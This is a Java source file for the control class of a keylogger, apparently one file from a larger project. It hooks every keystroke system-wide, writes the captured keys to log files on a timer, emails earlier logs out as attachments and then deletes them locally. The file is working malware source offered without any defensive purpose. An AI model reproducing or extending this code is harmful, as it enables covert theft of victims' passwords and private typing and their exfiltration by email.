package com.mossad.keylogger.logic;

import com.mossad.keylogger.files.LogFilesCollector;
import com.mossad.keylogger.logging.LogRecorder;
import com.mossad.keylogger.mail.MailSender;
import com.mossad.keylogger.reader.KeyReader;
import com.mossad.keylogger.timer.WriterTask;
import org.apache.commons.mail.EmailException;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.List;
import java.util.Timer;
import java.util.logging.Logger;

public class LogicFlow {

    private final Logger LOG = Logger.getLogger(LogicFlow.class.getCanonicalName());

    private Timer timer;
    private WriterTask writerTask;
    private KeyReader keyReader;
    private LogRecorder logRecorder;
    private MailSender mailSender;
    private LogFilesCollector logFilesCollector;
    private List<String> files;

    public LogicFlow(){
        mailSender = new MailSender();
        timer = new Timer();
        keyReader = new KeyReader();
        logRecorder = new LogRecorder();
        writerTask = new WriterTask(keyReader,logRecorder);
        logFilesCollector = new LogFilesCollector();
    }

    public void execute () throws NativeHookException {

        files = logFilesCollector.collectLogs();
        try {
            mailSender.prepareEmailWithAtatchment(files);
            mailSender.send();
        } catch (EmailException e) {
            LOG.info("Mail nie wysalny: " + e.getMessage());
        }

        logFilesCollector.removeLogs(files);
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(keyReader);
        timer.schedule(writerTask,1000L,10000L);
    }

    public void stop(){
        timer.cancel();
    }


}


